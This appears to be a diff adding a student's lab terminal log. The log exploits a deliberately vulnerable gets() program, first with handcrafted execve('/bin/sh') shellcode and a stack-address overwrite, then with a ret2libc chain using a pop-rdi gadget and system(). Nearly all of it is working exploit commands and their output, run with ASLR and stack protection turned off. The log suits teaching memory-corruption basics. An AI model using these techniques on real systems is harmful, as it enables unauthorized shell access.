@@ -1,0 +1,176 @@
+
+james@james-VirtualBox:~/Desktop/P2$ gcc shell.c
+james@james-VirtualBox:~/Desktop/P2$ ./a.out
+$ exit
+james@james-VirtualBox:~/Desktop/P2$ objdump -d a.out | sed -n '/needle0/,/needle1/p'
+0000000000000664 <needle0>:
+ 664:	eb 0e                	jmp    674 <there>
+
+0000000000000666 <here>:
+ 666:	5f                   	pop    %rdi
+ 667:	48 31 c0             	xor    %rax,%rax
+ 66a:	b0 3b                	mov    $0x3b,%al
+ 66c:	48 31 f6             	xor    %rsi,%rsi
+ 66f:	48 31 d2             	xor    %rdx,%rdx
+ 672:	0f 05                	syscall 
+
+0000000000000674 <there>:
+ 674:	e8 ed ff ff ff       	callq  666 <here>
+ 679:	2f                   	(bad)  
+ 67a:	62                   	(bad)  
+ 67b:	69                   	.byte 0x69
+ 67c:	6e                   	outsb  %ds:(%rsi),(%dx)
+ 67d:	2f                   	(bad)  
+ 67e:	73 68                	jae    6e8 <__libc_csu_init+0x48>
+	...
+
+0000000000000681 <needle1>:
+
+james@james-VirtualBox:~/Desktop/P2$ echo $((0x681-0x664))29
+james@james-VirtualBox:~/Desktop/P2$ xxd -s0x664 -l32 -p a.out shellcode
+james@james-VirtualBox:~/Desktop/P2$ cat shellcode
+eb0e5f4831c0b03b4831f64831d20f05e8edffffff2f62696e2f736800ef
+bead
+james@james-VirtualBox:~/Desktop/P2$ gcc -fno-stack-protector -o victim victim.cvictim.c: In function ‘main’:
+victim.c:6:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
+   gets(name);
+   ^~~~
+/tmp/cc7cwvln.o: In function `main':
+victim.c:(.text+0x39): warning: the `gets' function is dangerous and should not be used.
+james@james-VirtualBox:~/Desktop/P2$ execstack -s victim
+james@james-VirtualBox:~/Desktop/P2$ setarch `arch` -R ./victim
+0x7fffffffe130
+What's your name?
+
+james@james-VirtualBox:~/Desktop/P2$ a=`printf %016x 0x7fffffffe130 | tac -rs..`
+james@james-VirtualBox:~/Desktop/P2$ echo $a
+30e1ffffff7f0000
+
+
+
+
+
+
+In One Terminal:
+james@james-VirtualBox:~/Desktop/P2$ setarch `arch` -R ./victim
+0x7fffffffe130
+What's your name?
+
+
+In Another Terminal:
+james@james-VirtualBox:~/Desktop/P2$ ps -o cmd,esp -C victim
+CMD                              ESP
+./victim                    ffffe0b8
+
+
+james@james-VirtualBox:~/Desktop/P2$ echo $((0x7fffffe130-0x7fffffe0b8))
+120
+
+Offset of the buffer is: 120
+
+
+--------------------------------------------------------------------------------
+WITH ASLR OFF:
+
+james@james-VirtualBox:~/Desktop/P2$ ./victim
+0x7ffe8f145c30
+What's your name?
+
+
+james@james-VirtualBox:~/Desktop/P2$ ps -o cmd,esp -C victim
+CMD                              ESP
+./victim                    8f145bb8
+
+
+james@james-VirtualBox:~/Desktop/P2$ printf %x\\n $((0x7fff8f145bb8+120))
+7fff8f145c30
+--------------------------------------------------------------------------------
+
+
+
+
+
+---------------------------------------------------------------------------------------------------
+
+
+
+
+IN ONE TERMINAL:
+
+james@james-VirtualBox:~/Desktop/P2$ cat pip|./victim
+0x7ffff0ed8350
+What's your name?
+Hello, _H1��;H1�H1�����/bin/sh!
+a.out  pip  shell.c  shellcode	victim	victim.c
+total 56
+drwxrwxr-x 2 james james  4096 Dec 11 16:44 .
+drwxr-xr-x 3 james james  4096 Dec  9 20:57 ..
+-rw------- 1 james james 12288 Dec  9 20:58 .shell.c.swp
+-rwxrwxr-x 1 james james  8496 Dec 11 16:09 a.out
+prw-rw-r-- 1 james james     0 Dec 11 16:49 pip
+-rw-rw-r-- 1 james james   276 Dec  9 21:00 shell.c
+-rw-rw-r-- 1 james james    66 Dec 11 16:10 shellcode
+-rwxrwxr-x 1 james james  8504 Dec 11 16:11 victim
+-rw-rw-r-- 1 james james   191 Dec 10 16:38 victim.c
+
+
+IN ANOTHER TERMINAL:
+
+james@james-VirtualBox:~/Desktop/P2$ sp=`ps --no-header -C victim -o esp`james@james-VirtualBox:~/Desktop/P2$ echo $sp
+f0ed82d8
+james@james-VirtualBox:~/Desktop/P2$ a=`printf %016x $((0x7fff$sp+120)) | tac -r -s..`
+james@james-VirtualBox:~/Desktop/P2$ echo $a
+5083edf0ff7f0000
+james@james-VirtualBox:~/Desktop/P2$ a=`printf %016x $((0x7fff$sp+120)) | tac -r -s..`
+james@james-VirtualBox:~/Desktop/P2$ ( ( cat shellcode ; printf %080d 0 ; echo $a ) | xxd -r -p ; cat ) > pip
+
+ls
+ls -al
+
+------------------------------------------------------------------------------------------------
+
+
+james@james-VirtualBox:~/Desktop/P2$ locate libc.so
+/lib/x86_64-linux-gnu/libc.so.6
+/usr/lib/x86_64-linux-gnu/libc.so
+
+james@james-VirtualBox:~/Desktop/P2$ xxd -c1 -p /lib/x86_64-linux-gnu/libc.so.6 | grep -n -B1 c3 | grep 5f -m1 | awk '{printf"%x\n",$1-1}'
+1fd7a
+
+james@james-VirtualBox:~/Desktop/P2$ setarch `arch` -R ./victim
+0x7fffffffe140
+What's your name?
+
+james@james-VirtualBox:~/Desktop/P2$ pid=`ps -C victim -o pid --no-headers | tr -d ' '`
+james@james-VirtualBox:~/Desktop/P2$ grep libc /proc/$pid/maps
+7ffff7a11000-7ffff7bce000 r-xp 00000000 08:01 4587555                    /lib/x86_64-linux-gnu/libc-2.24.so
+7ffff7bce000-7ffff7dce000 ---p 001bd000 08:01 4587555                    /lib/x86_64-linux-gnu/libc-2.24.so
+7ffff7dce000-7ffff7dd2000 r--p 001bd000 08:01 4587555                    /lib/x86_64-linux-gnu/libc-2.24.so
+7ffff7dd2000-7ffff7dd4000 rw-p 001c1000 08:01 4587555                    /lib/x86_64-linux-gnu/libc-2.24.so
+
+
+james@james-VirtualBox:~/Desktop/P2$ nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep '\<system\>'
+00000000000456d0 W system
+
+
+
+
+
+james@james-VirtualBox:~/Desktop/P2$ (echo -n /bin/sh | xxd -p; printf %0130d 0; printf %016x $((0x7ffff7bce000+0x1fd7a)) | tac -rs..; printf %016x 0x7fffffffe140 | tac -rs..; printf %016x $((0x7ffff7bce000+0x456d0)) | tac -rs..) | xxd -r -p | setarch `arch` -R ./victim
+0x7fffffffe130
+What's your name?
+Hello, /bin/sh!
+Segmentation fault (core dumped)
+
+
+james@james-VirtualBox:~/Desktop/P2$ (echo -n /bin/sh | xxd -p; printf %080d 0; printf %016x $((0x7ffff7bce000+0x1fd7a)) | tac -rs..; printf %016x 0x7fffffffe140 | tac -rs..; printf %016x $((0x7ffff7bce000+0x456d0)) | tac -rs..) | xxd -r -p | setarch `arch` -R ./victim
+0x7fffffffe130
+What's your name?
+Hello, /bin/sh!
+
+
+
+
+
+
+
